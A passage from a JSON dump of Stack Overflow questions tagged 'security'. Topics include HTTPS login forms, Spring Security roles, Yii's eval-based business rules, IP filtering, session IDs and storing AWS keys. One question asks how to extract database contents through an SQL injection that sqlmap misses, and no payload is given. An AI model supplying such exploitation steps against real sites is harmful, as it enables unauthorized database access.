point</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":59,"score":2,"question_id":12248770,"title":"Is it normal for the password to appear in PHP post request even though it's an HTTPS page?","body":"<p>In PHP, when making a login page, if your page is HTTPS, is it common for the username/password to appear in the request post information?</p>\n\n<p>Shouldn't the password be encrypted? What am I missing?</p>\n\n<p>Here is an example of what I'm talking about: this website is called souq.com where you can see in Firebug monitoring it's showing the username and password.</p>\n\n<p><img src=\"http://i.stack.imgur.com/ThySR.png\" alt=\"Souq.com screenshot\"></p>\n"},{"tags":["hibernate","security","acl","rhino","access-control"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12249357,"title":"Role based access control in Hibernate","body":"<p>I'm working on a simple CRUD application based on vert.x platform. I'm using Rhino/JavaScript for the backend part which allows me to use Java classes. So, Hibernate is my ORM there. I use \"dynamic-map\" as entity mode which allows me to work with HashMaps instead of Java classes for persistent objects.</p>\n\n<p>The quiestions is how to implement entity/row-level access control in this architecture.</p>\n\n<p>I've read something about interceptors, but I didn't get how to filter un-allowed content there (throw an exception?). Using filters is also an option, but as I understood I can control only querying, not persisting with them.</p>\n\n<p>The only solution I've found for now is to filter data during pre-/post-processing, but I affraid that it could be a performance bottleneck there.</p>\n"},{"tags":["java","spring","security","aspectj","spring-aop"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12248716,"title":"Conditional behavior of Spring-AOP Before Advice","body":"<p>I'm a little new to AOP, and got confused about the problem I'm facing. I have the Annotation <code>@AuthorizeUser</code> which acts on methods, on Presentation Layer. I need to check if User is authorized to execute that method or not. Here is the code for <code>AuthorizeUserAspect</code>:\n<br /></p>\n\n<pre><code>@Aspect\npublic class AuthorizeUserAspect {\n    @AuthoWired\n    private UserService service;\n\n    @Before(value = \"@annotation(com.company.annotation.AuthorizeUser)\")\n    public void isAuthorized(JoinPoint jp) {\n        // Check if the user has permission or not\n        // executing some Service Layer services and \n        // Persistence Layer, corresponding to that\n        service.checkUser();\n\n        // Is there a way I can make this method Conditional. something like:\n        if ( /* User has permission */ ) {\n            // do nothing, so the method will be executed after this\n        }\n        else {\n            // 1) Prevent the Method to be executed [and/or]\n            // 2) Pass some Parameters to the method for checking [and/or]\n            // 3) Execute another method on that class [e.g showAccessDenied()]\n        }\n    }\n}\n</code></pre>\n\n<p>It's a little bit similar to this question <a href=\"http://stackoverflow.com/questions/4907072/spring-mvc-before-advice-check-security\">Spring MVC + Before Advice check security</a>. But it suggested to return some String (ie. \"Not OK\"). There are two types of UI in my application (Struts and Jersey), so there would be two type of return type (<code>String</code> and <code>Response</code> respectively). So I guess that might not be the best way to do it.<br />\n<br />\nI would be very glad if you could show me a workaround for this.<br />\nIs this even a good approach or not?</p>\n"},{"tags":["silverlight","security","telerik","audio-streaming"],"answer_count":1,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":81,"score":5,"question_id":12007452,"title":"only logged in users can play audio from our server","body":"<p>We have made a silverlight application where users can preview audio files from their browser from the telerik radmediaplayer control.</p>\n\n<p>The files are on a webserver and anyone who sniffs the trafic can download the file.\nWe would like to <strong>prevent non-logged-in users from accessing/downloading these files</strong>.</p>\n\n<p>Besides providing the application with some sort of temporary valid url and implementing a custom httphandler... what are our options?</p>\n\n<p>It's not too big of a problem if our customers can download the files, we just don't want the rest of the world to also have access.</p>\n\n<p>Any ideas would be more than welcome!</p>\n\n<p>[Update]\nThe only thing I can come up with is:</p>\n\n<ul>\n<li>host the files in a non-public folder</li>\n<li>if a user requests to prelisten a file, copy it to a public folder under a new name ([guid].mp3) and return it's url</li>\n<li>every x minutes clean the public folder.</li>\n</ul>\n"},{"tags":["security",".htaccess","codeigniter","robots"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12247040,"title":"How to restrict access to files in a folder in codeigniter","body":"<p>Hello I have used codeigniter to develop my website but when my website is searched in google , google shows up links to the files (pdf) in a particular folder and user can view these files (pdf) directly without login. I want to restrict google to directly show the links to these files. \nex: www.mywebsite/myfolder/myfile</p>\n\n<p>Please guide me how can I accomplish this. Thank you.</p>\n"},{"tags":["html5","security","same-origin-policy","key-value-store"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12245854,"title":"In browsers that support HTML5, how is the same origin policy handled with respect to key-value database on the local filesystem?","body":"<p>I have a webapp that has, as a major attraction, that it handles partial personal information management out of a key-value store. It works at a basic level when accessed from my website; I would like to know how well it works or doesn't work packaged as a downloadable zipfile, saved page, etc., and if there is anything I can do to let it work better when run as a local file instead of downloaded from a browser.</p>\n\n<p>How do the browsers' key-value stores handle the origin being a point on the local filesystem?</p>\n"},{"tags":["security","web-applications","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":10751737,"title":"Guidance for Security Testing of Web applications","body":"<p>I am very new to the security testing of web applications.I want to test some web applications for security testing.So i have gone through the attacks like SOL-injection, XSS ,CSRF etc. Now i am into the some tools where i am stuck right now. So i need some advice here , should i use automated tools or do it manually the security testing.Any suggestions on how should i go for security testing and becoming an expert in this area.</p>\n\n<p>Currently i am using some tools like Paros and zaproxy for finding vulnerabilities.But these are all at the basic level i want to go deeper int this area.</p>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":5616125,"title":"Securing a client-side Java application","body":"<p>Recently I've been developing a client-side Java Swing application for a client, and I've had a creeping concern that at any given time the client could simply take a snapshot build of the system and run-off with it.</p>\n\n<p>The app needs to be connected to the internet in order to do anything, and I was hoping on getting some tips on how I could put some sort of security in-place to prevent the system from working if I wanted to  i.e. he may copy/install the application somewhere else without me knowing about it (edit from the comment <a href=\"http://stackoverflow.com/questions/5616125/securing-a-client-side-java-application#comment6398714_5616174\">here</a>).</p>\n\n<p>I'd need this to be fairly transparent to the client, and it wouldn't need to be 100% robust as the client is not technically competent and is unlikely to try to 'crack' any security that is there.</p>\n\n<p>Any tips would be much appreciated!</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","jsp","servlets","authorization"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":380,"score":1,"question_id":9678959,"title":"How to secure my java web application?","body":"<p>I have a web application in which when users login they reach the <code>mainjsp.jsp</code> page.</p>\n\n<p>In this page there are few text-box for dates and based on dates and selection from another drop-down, data is submitted. This data is retrieved by a <code>servlet</code> and brought back to the <code>mainjsp</code> page.</p>\n\n<p>My concern is about security. Now when I copy paste the <code>mainjsp.jsp</code> page's URL and paste it in any browser this page appears as it is. I don't want this to happen. I want the users to login first and hence I want my web application secure.</p>\n\n<p>I don't have any idea how to do this. Could you please tell me how can I achieve this?</p>\n\n<p>Also please tell me how do I achieve this for any of the pages in the web-application. Users should not be able to access any page if they haven't logged in.</p>\n"},{"tags":["php","security","rbac"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1009,"score":1,"question_id":4418369,"title":"Are BizRules (Business Rules) in RBAC really safe?","body":"<p>The idea of BizRules in RBAC (Role Based Access Control) makes me feel sick. It is basically a way to define a script to run against data during authorization.</p>\n\n<p>For example, Yii framework supports it: <a href=\"http://www.yiiframework.com/doc/api/1.1/CAuthManager#createRole-detail\" rel=\"nofollow\">http://www.yiiframework.com/doc/api/1.1/CAuthManager#createRole-detail</a></p>\n\n<p><code>public CAuthItem createRole(string $name, string $description='', string $bizRule=NULL, mixed $data=NULL)</code></p>\n\n<p>Here's the source code for executing a business rule:</p>\n\n<pre><code>    /**\n     * Executes the specified business rule.\n     * @param string $bizRule the business rule to be executed.\n     * @param array $params parameters passed to {@link IAuthManager::checkAccess}.\n     * @param mixed $data additional data associated with the authorization item or assignment.\n     * @return boolean whether the business rule returns true.\n     * If the business rule is empty, it will still return true.\n     */\n    public function executeBizRule($bizRule,$params,$data)\n    {\n            return $bizRule==='' || $bizRule===null || ($this-&gt;showErrors ? eval($bizRule)!=0 : @eval($bizRule)!=0);\n    }\n</code></pre>\n\n<p>So, you can do things like:</p>\n\n<pre><code>    // Assume this bizRule: $bizRule='return Yii::app()-&gt;user-&gt;id==$params[\"post\"]-&gt;authID;';\n    Yii::app()-&gt;user-&gt;checkAccess('createUser', array('post' =&gt; $post));\n</code></pre>\n\n<p>It basically evals the bizRule having the $params set to the given array in its context.</p>\n\n<p>I don't like those business rules in terms of security. Is there a better way of doing it?</p>\n"},{"tags":["c#","asp.net","security","session","portal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12244177,"title":"leave all the sites after exit the portal?","body":"<p>I have the following problem :</p>\n\n<p>I have a web application like a portal to many sites .</p>\n\n<p>When i click a link to a web site on the portal then click <code>Exit</code> to leave the portal ,the window to that site is still there and this is not secure at all because the user could forget to close the browser just after exit the portal .</p>\n\n<p><strong>Note:</strong></p>\n\n<ul>\n<li>The portal is in a specific server .</li>\n<li>the web sites are in different servers .</li>\n</ul>\n\n<hr>\n\n<p>Is there some way to enable me to leave all the pages after click exit button on the portal ?</p>\n"},{"tags":["security","symfony2","acl","fosuserbundle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12236300,"title":"Symfony2 and security roles configuration","body":"<p>I'm trying to configure Symfony ACL:</p>\n\n<pre><code>access_control:\n    - { path: ^/, role: ROLE_A }\n\nrole_hierarchy:\n    ROLE_A:           ROLE_USER\n    ROLE_B:           ROLE_A\n    ROLE_ADMIN:       ROLE_B\n    ROLE_SUPER_ADMIN: ROLE_ADMIN\n</code></pre>\n\n<p>So: <code>A</code> extends from <code>USER</code>, <code>B</code> from <code>A</code> etc.</p>\n\n<p>The problem is that when I login as <code>ADMIN</code> or <code>SUPER_ADMIN</code> I'm getting <code>403</code> Not Authorized. It only works when I'm authorized as <code>A</code>. Why? What I'm doing wrong with role extending?</p>\n"},{"tags":["flash","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":158,"score":0,"question_id":12093375,"title":"Flash, SecurityError: Error #2028: Local-with-filesystem SWF cannot access Internet URL","body":"<p>There is a number of flashfiles that my application is very much dependent of, and unfortunately, when i am trying to run my app on a server different from the one we have been developing it on, i get the following error:</p>\n\n<pre>SecurityError: Error #2028: Local-with-filesystem SWF file file:///C|/Users/user/Desktop/flash/flash.swf cannot access Internet URL rtmp://192.168.1.33/rtmp</pre>\n\n<p>I tried adding the <code>crossdomain.xml</code> file to the server, however, it doesn't work. Is there anything i can do to allow that file to access that stream?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12240861,"title":"Secure download of data in Android application","body":"<p>I have an URL which returns JSON string with my data. Now, I would like to keep this data in secret, so only my Android application could display it. </p>\n\n<p>My first idea was to encode data with private key (on the server-side) and store the same private key in the application, so it can decode the message. However, attacker (user) can decomplie the .apk and obtain the private key.</p>\n\n<ol>\n<li>Do you have an idea how to secure it?</li>\n<li>Decompiling Java is <a href=\"http://stackoverflow.com/questions/272535/how-do-i-decompile-java-class-files\">simple</a>. How about Android .apk? I heard that there is something called ProGuard - does Android use this by default and does it secure the code? </li>\n</ol>\n"},{"tags":["asp.net","security","adam","adfs"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":578,"score":1,"question_id":839206,"title":"ADFS and ASP.NET","body":"<p>Just looking for clarification on the above topics.</p>\n\n<ul>\n<li>There are a number of domains with their own AD</li>\n<li>The domain where my ASP.NET application is running hosts the ADFS server (the root domain)</li>\n<li>there are TRUSTs established between each domain and the root domain</li>\n</ul>\n\n<p>Then there shouldn't be a problem?  I don't use Forms authentication, instead I explictly need to say in the web.config that I'm using ADFS, am I right?</p>\n\n<p>How does ADAM fit into all of this?  I don't see that I need it, as each domain has their own AD.  ADAM is a separate user-store to AD?</p>\n\n<p>Is this right, or am I waaaaay off?</p>\n\n<p>Thanks</p>\n"},{"tags":["ruby-on-rails","security","heroku","ip","rack"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":153,"score":4,"question_id":12136260,"title":"How can you block or filter IP addresses on Heroku?","body":"<p>Is there a way to implement IP filtering or IP access rules much like I would with nginx/apache to restrict or block certain IPs on Heroku?</p>\n\n<p><strong>Note:</strong> I know this can be done from within my application (Rails 3.2) very easily but I don't think this is the most efficient use of my resources on Heroku.  Also, a Rack based solution would be better than implementing the filtering in Rails.</p>\n"},{"tags":["java","android","security","ssl","handshake"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":198,"score":0,"question_id":12231665,"title":"Google GCM can't do SSL handshake for Java SSL Server","body":"<p>I've recently found out about Google's Cloud Messaging for Android and I wanted to integrate my app to use it. I got the Android side of the project working and the app is being correctly registered with the server. The problem is that my server can't seem to be able to authenticate the GCM servers so it can talk to them. Here's what I mean:</p>\n\n<p>Currently, my server is a simple Java-based SSL server with a keystore and a truststore. The truststore contains the client's key (i.e. the app's key) and vice versa and the client/server can talk to each other over SSL without any problems. The code I am using to send a message to the app is this:</p>\n\n<pre><code>Sender sender = new Sender( \"API_KEY\" );\nMessage message = new Message.Builder().addData( \"message\", description ).build();\nResult result = sender.send( message, ID, 1 );\n</code></pre>\n\n<p>It gives my the following exception:</p>\n\n<pre><code>javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n</code></pre>\n\n<p>When I start my server I pass in the name of the trust/keystores and their passwords and load them, so that they can be used to talk to the client. I suspect that the problem is that currently the truststore only contains the client's key, so the server can ONLY talk to the client and no one else. Is this correct, and if it is, anyone have any ideas how to add the GCM certificate to the truststore or something?</p>\n\n<p>Thanks a lot, any help is much appreciated :)</p>\n\n<p>P.S. I tried to just send a message to the client <em>before</em> I load the truststore in the server and the app received it successfully.</p>\n"},{"tags":["flash","security","api","cross-domain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12236550,"title":"crossdomain.xml vulnerabilities","body":"<p>I'm developing an AS3 library that will interact with my REST API. since I need a crossdomain.xml file in all my API servers, I would like to better understand the vulnerabilities expected.</p>\n\n<p>your thoughts? </p>\n"},{"tags":["sql","security","sql-injection"],"answer_count":9,"favorite_count":22,"up_vote_count":34,"down_vote_count":0,"view_count":14277,"score":34,"question_id":190435,"title":"How Can I test my web site for SQL injection attacks?","body":"<p>What automated tools are there?</p>\n"},{"tags":["security","testing","web-applications","security-testing"],"answer_count":7,"favorite_count":6,"up_vote_count":12,"down_vote_count":0,"view_count":1763,"score":12,"question_id":112687,"title":"What tools do you use to security test your web applications?","body":"<p>Are there any tools you recommend for security testing your web applications?</p>\n\n<p>I have used WebScarab from OWASP, but find it a bit difficult and unwieldy to use. </p>\n\n<p>Is there anything else you would suggest using?</p>\n"},{"tags":["security","sql-injection","auditing","sqlmap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11557075,"title":"sqlmap detection","body":"<p>I use sqlmap 0.9 for my sql injection audit.</p>\n\n<p>I launched sqlmap with the url. I know there is a sql injection in the variable <em>order</em> but sqlmap does not detect it.</p>\n\n<p>I know the sql injection exists because when I inject the <code>rand()</code> function, the result is in random order. :)</p>\n\n<p>I would like to know how I can retrieve information from the DB even though sqlmap does not detect the injection attack. Maybe a regex, no?</p>\n\n<p>My second question is: sqlmap is open source code. I wish to understand the code but there are no comments and no applicative conception. I would like to know the techniques used by sqlmap to retrieve the information.</p>\n"},{"tags":["windows","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12235820,"title":"Windows 7 Credential Manager Private Key","body":"<p>I am wondering, what is the Private key for \"Windows 7 Credential Manager\". Is it the local Machine key? is it the Windows User GUID?</p>\n\n<p>Could you advice if it safe to store password using that feature? or someone can decrypt it even without log-in to my machine.</p>\n\n<p>Thanks.</p>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12230904,"title":"spring security and using CustumUserDetails","body":"<p>Can anybody help me with spring security?\nI have two folder under views 1: allusers 2: superusers\nall users have hasRole(\"ROLE_USER\") and superusers have: haseRole(\"ROLE_ADMIN\",\"ROLE_USER\")\nI want when a user how has the ROLE_ADMIN after log in be redirect to the right folder i.e supersusers's folder and that one with only ROLE_USER to the allusers's folder. \nDon't know how can I do it.</p>\n\n<p>spring-security.xml</p>\n\n<pre><code>&lt;beans:beans xmlns=\"http://www.springframework.org/schema/security\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org  /2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\nhttp://www.springframework.org/schema/security\nhttp://www.springframework.org/schema/security/spring-security-3.0.3.xsd\"&gt;\n\n&lt;http auto-config=\"true\" use-expressions=\"true\"&gt;\n\n    &lt;!-- interceptor pages --&gt;\n    &lt;intercept-url pattern=\"/**\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/index\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/allusers/**\" access=\"hasRole('ROLE_USER')\" /&gt;\n    &lt;intercept-url pattern=\"/superusers/**\" access=\"hasAnyRole('ROLE_ADMIN','ROLE_USER')\" /&gt;\n    &lt;intercept-url pattern=\"/logout\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/denied\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/getAllUsers\"  access=\"hasRole('ROLE_ADMIN')\" /&gt;\n    &lt;access-denied-handler error-page=\"/403\" /&gt;\n\n\n    &lt;form-login login-page=\"/index\" default-target-url=\"/welcome\"\n        authentication-failure-url=\"/loginfailed\" /&gt;\n\n    &lt;logout logout-success-url=\"/logout\" /&gt;\n\n&lt;/http&gt;\n&lt;authentication-manager&gt;\n    &lt;authentication-provider&gt;\n        &lt;jdbc-user-service data-source-ref=\"dataSource\"\n            users-by-username-query=\"\n                            select username,password,'true' AS isEnabled from USER where USERNAME=?\"  \n            authorities-by-username-query=\"\n            select u.username ,r.`ROLE_NAME`,u.`PASSWORD` from USER u, USER_ROLE ur,ROLE r where (u.user_id = ur.user_id) \n            and (r.role_id=ur.role_id)  and u.username =? \" /&gt;\n    &lt;/authentication-provider&gt;\n&lt;/authentication-manager&gt;\n</code></pre>\n\n<p> </p>\n\n<p>Here is my mvc-dispatcher.xml</p>\n\n<pre><code>    &lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:context=\"http://www.springframework.org/schema/context\"\nxmlns:mvc=\"http://www.springframework.org/schema/mvc\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"\n    http://www.springframework.org/schema/beans     \n    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\n    http://www.springframework.org/schema/mvc\n    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd\n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context-3.0.xsd\"&gt;\n\n&lt;context:component-scan base-package=\"com.secure.weblayer\" /&gt;\n&lt;mvc:annotation-driven /&gt;\n&lt;context:annotation-config /&gt;\n&lt;mvc:resources mapping=\"/resources/**\" location=\"/resources/\" /&gt;\n&lt;bean\n    class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt;\n    &lt;property name=\"prefix\" value=\"/WEB-INF/views/\" /&gt;\n     &lt;!--   &lt;property name=\"prefix\" value=\"/WEB-INF/views/allusers/\" /&gt;--&gt;\n     &lt;!--   &lt;property name=\"prefix\" value=\"/WEB-INF/views/superusers\" /&gt;--&gt;\n    &lt;property name=\"suffix\" value=\".jsp\" /&gt;\n&lt;/bean&gt;\n&lt;bean id=\"messageSource\"\n    class=\"org.springframework.context.support.ResourceBundleMessageSource\"&gt;\n    &lt;property name=\"basenames\" value=\"mymessages\"&gt;&lt;/property&gt;\n&lt;/bean&gt;\n&lt;bean\n   class=\"org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter\" /&gt;\n&lt;bean\nclass=\"org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping\" /&gt;\n   &lt;/beans&gt;\n</code></pre>\n\n<p>As you can see I use sql-query in my spring-security.xml for log in. \nI can log in but can not be redirect to any desired pages. But when I in the xml file changethe property to : property name=\"prefix\" value=\"/WEB-INF/views/allusers\"<br>\nor  : property name=\"prefix\" value=\"/WEB-INF/views/superusers\" \nI can get access to all pages in those folders but not at the same time.</p>\n\n<p><br/>\nPlease any help?</p>\n"},{"tags":["wordpress","security","phishing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12234157,"title":"Possible Wordpress exploitation","body":"<p>Does anybody know of a security vulnerability in Wordpress whereby fraudsters are sending out banking phishing emails (purporting to be banks) with a login link pointing to a valid domain but with extended path that may be unknown to the legitimate owner of the domain?</p>\n\n<p>For Example:</p>\n\n<pre><code>href = [HOST]=http://www.ponnuki.net\n   [EXTENSION] = /wordpress/MOBILE-DO/absa-mobiledo/absaBanking/index.php\n</code></pre>\n\n<p>Judging from the number of these I have been receiving recently, it appears that the hosts are not geo-specific, so the obvious conclusion is that they are seeking out vulnerable hosts to piggy-back on.</p>\n\n<p>Can someone recommend who would be the best to report this to?</p>\n"},{"tags":["asp.net","security","file","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12161618,"title":"Security Exception When Writing File On Hosting Server","body":"<p>My ASP.NET web application writes to a local file. On my dev server it works fine, but when hosted I get a Security Exception at the line of code which writes.</p>\n\n<p><img src=\"http://i.stack.imgur.com/BH61V.png\" alt=\"enter image description here\"></p>\n\n<p>I googled around and found explanations regarding trust level the web.config. Does changing the trust level have any negative impact on security? Is this the only way to resolve this?</p>\n\n<p>Thanks for any help.</p>\n"},{"tags":["java","security","networking","ip","filtering"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":76,"score":-3,"question_id":12229715,"title":"IP Filtering code","body":"<p>I've very small experience in network programming although I've good background in networking\nI'm working on packet filtering system , I'm just wanna to divide my work into steps . </p>\n\n<p>starting by IP filtering .. and so on . but I dunno really how i should start , will you help \nme please on that point , how i should start to write a code to filter a packet bassed on IP\n address .. any suggestions .. alogorthims , java library i can use .</p>\n\n<p>I need as much as possible of information to start writing a code , please</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12233152,"title":"When should the session ID be regenerated?","body":"<p>I know it is good practice to use session_regenerate_id(). I've heard some people that say it should be used extensively, and others that say it should just be used on login/logout. Is there any justification to the latter? Is running the function an expensive process that should be avoided when it is not really necessary?</p>\n\n<p><strong>Edit</strong>: More than anything, I really want to know the justification for your answer.</p>\n"},{"tags":["php","c++","security","soap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12228955,"title":"secure communication between PHP and C++","body":"<p>I have an application written in C++, and I'd like to send requests and get data securily from it by PHP. I was thinking about using SOAP but I'd like to ask you if there are any other possibilites. Thanks.</p>\n"},{"tags":["actionscript-3","flash","security","clipboard","flash-player"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":11915620,"title":"Actionscript 3 Get clipboard data (fp 11)","body":"<p>I would like to get clipboard text in AS3 (flex, flashdevelop). I know I can't just monitor clipboard, because while most other environments can, flash application are evil and can guess when they see a password and to what account it actually belongs. That's why I listen to an MouseEvent.CLICK event, but looks like it changed recently and Flash still says \"no, no!\". That's why I addEventListener ( Event.Paste ) to a TextField, but looks like the TextField doesn't dispatch such an Event. </p>\n\n<p>I tried many solutions over Internet but they just don't work, and documentation regarding clipboard is often outdated.</p>\n\n<p>Do I miss something, or Adobe's logo color has it's root in socialism?</p>\n"},{"tags":["php","security","transactions","banking"],"answer_count":0,"favorite_count":4,"up_vote_count":12,"down_vote_count":1,"view_count":132,"score":11,"question_id":12228566,"title":"why php is not used for banking site or for a banking transaction?","body":"<p>Other scripting languages popular on the web, such as java and .net, are used for banking site. However, I've rarely (if ever) seen a PHP application designed to be deployed for a banking site.Why is this? What about PHP is holding it back from this, or what about these other languages make them popular for secure transaction?\nI think we have a lots of functionality like session to perform secure transaction than why people is not use this?or please let me know the drawbacks of php in security? </p>\n"},{"tags":["security","authorization","admin","cancan","dashboard"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12228489,"title":"Security of dashboard mingling admin & public user roles VS keeping them separate...?","body":"<p>I am building a Rails 3.2 site with public-facing users who can join and choose one or multiple roles as well as a behind-the-scenes admin, which will likely be divided into multiple separate roles as the site expands. I want to build a custom dashboard as I have very specific needs.</p>\n\n<p>I want to keep things as DRY as possible to prevent having to maintain two sets of code, one for each dashboard, yet I want to be able to sleep well at night knowing that my sensitive admin info will not accidentally (or maliciously on purpose) be mingled with the public users stuff.</p>\n\n<p>In such a case, is it better to keep the public-facing and private-facing areas (containing sensitive info) separate, or would an authorization gem (specifically looking into CanCan) be iron-clad enough to prevent possible co-mingling if all were in one dashboard?</p>\n"},{"tags":["security","lamp","penetration-testing","penetration-tools"],"answer_count":6,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":1627,"score":6,"question_id":2571978,"title":"What type of penetration-testing tools are available for web applications","body":"<p>I am in late testing phase of my web application. The application will be tested at a larger scale now.</p>\n\n<p>During this time I want to test my website against various types of known penetration tools. </p>\n\n<p>I am aware that it will be better to let a professional handle this subject, and this will be happening. But before I take that route I want to do all I can to make the application so secure as possible, so that when the pro does his work, he does not come back with a large list of things I could have done before hiring him.</p>\n\n<p>I am not looking for advanced methods of breaking in to a system. Just some hints on known attacks other than the OWASP vulnerabilities.</p>\n\n<p>My system is nginx,apache,php,mysql on Linux CentOS.</p>\n"},{"tags":["security","node.js","amazon-web-services"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12227564,"title":"How to securly store and use a customer's AWS Secret Key","body":"<p>Is it acceptable to store a customer's secret key &amp; access key id on my server to allow me to access the AWS API on their behalf?</p>\n\n<p>For a password it is simply a matter of using a hash to store an encrypted version but I need to use the actual key value each time I call AWS so I cannot hash it.</p>\n\n<p>In simple terms, for each authenticated user I would store an object a bit like this:</p>\n\n<pre><code>{userdId: [myUserId],\n secretKey: 'jHuiU-jiuhd...',\n accessKeyId: 'abcdef...',\n etc}\n</code></pre>\n\n<p>I could then access this each time I call AWS.</p>\n\n<p>Now, I could base64 encode it and / or even encrypt it myself, but at some stage I have to decode and decrypt it to make my request and everything I need to do these options will be stored somewhere on the server.</p>\n\n<p>If the data is kept on the server - never sent back to the client - and if the transport from server to AWS is done over SSL, then is this enough?</p>\n"},{"tags":[".net","security","hash"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12224540,"title":"does a weak named .NET assembly contains a manifest with a hash","body":"<p>One feature of the .NET assembly with a strong name is the resistance to tampering. Once the hash of the assembly content is calculated, it is encrypted with a private key, and then saved as a part of assembly's manifest.\nI am wondering - what if the assembly does not have a strong name, what happens with a hash? Is it saved to the manifest unencrypted? </p>\n"},{"tags":["security","google-chrome","https","jsonp","securitydomain"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":286,"score":4,"question_id":12216208,"title":"Chome now blocking all jsonp requests from https to http?","body":"<p>At some point recently Chrome has stopped showing data loaded via jsonp with the error </p>\n\n<p>[blocked] The page at <a href=\"https://user.example.com/category/12345\" rel=\"nofollow\">https://user.example.com/category/12345</a> ran insecure content from <a href=\"http://livedata.example.com/Data.svc/jsonp/GetData?category=12345&amp;callback=_jsp&amp;_1346417951424=\" rel=\"nofollow\">http://livedata.example.com/Data.svc/jsonp/GetData?category=12345&amp;callback=_jsp&amp;_1346417951424=</a>.</p>\n\n<p>It still works fine on all other browsers, and has been confirmed on several different computers running Chrome.</p>\n\n<p>The only mention I've seen of this problem before is when the page was served from one of Google's own domains (a security feature for Google Apps I guess?), is this something that has been enabled on all domains now in a recent version of Chrome? </p>\n\n<p>Ideally we don't want to have to enable https on our livedata subdomain because of the extra server load it would cause, the data is all publicly available so there's no pressing need to encrypt it.</p>\n"},{"tags":["security","azure","storage"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12224770,"title":"HTTP vs HTTPS Azure storage connection from worker role","body":"<p>Azure worke role, working with sensitive data, but performance is important. Same geo-location and affinity group.</p>\n\n<p>When connecting to Azure storage, should I use HTTPS? Or is HTTP secure enough since, since it's all inside Azure?</p>\n\n<p>In other words, is communication between Worker role and storage server happening on internal network? Or is it going through Internet, can be intercepted and I need to use HTTPS to secure data transmitted?</p>\n"},{"tags":["osx","security","testing","xcodebuild"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12224499,"title":"Vulnerability or Security testing tool for Mac applications","body":"<p>Is 